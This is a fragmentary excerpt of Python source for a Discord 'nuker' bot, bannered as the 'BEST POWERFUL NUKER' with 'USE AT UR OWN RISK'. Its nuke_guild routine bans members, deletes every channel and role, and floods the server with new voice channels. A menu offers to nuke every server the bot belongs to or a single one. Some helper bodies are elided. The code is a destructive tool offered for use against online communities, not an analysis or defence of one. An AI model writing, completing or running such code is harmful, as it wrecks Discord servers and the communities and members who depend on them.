...
{g}[+] MADE BY : {g}SHIVAM AND HACKER
{r}[+] BEST POWERFUL NUKER
{r}[+] USE AT UR OWN RISK
'''
...
async def nuke_guild(guild):
    ...
    print(f'{r}[+]Banned:{m}{banned}')
    deleted_channels = await delete_all_channel(guild)
    print(f'{r}[+]Delete Channels:{m}{deleted_channels}')
    delete_roles = await delete_all_roles(guild)
    print(f'{r}[+]Delete Roles:{m}{delete_roles}')
    created_channels = await create_voice_channels(guild,name)
    print(f'{r}[+]Create Voice Channels:{m}{created_channels}')
    #created_roles = await created_roles(guild,name)
    #print(f'{m}[+]Create Roles:{m}{created_roles}')
    print(f'{r}--------------------------------------------\n\n')
...
{c}--------------------------------------------
{b}[Select]
    {dr}└─[1] {g}- {g}Nuke of all servers.
    {dr}└─[2] {g}- {g}Nuke only one server.  
    {y}└─[3] {m}- {g}Exit
{y}====>{g}''')
        ...
        if choice_type == '1':
            ...
            async def on_ready():
                print(f'''
{g}[+]Logged as {client.user.name}
{m}[+]Bot in {len(client.guilds)} servers!''')
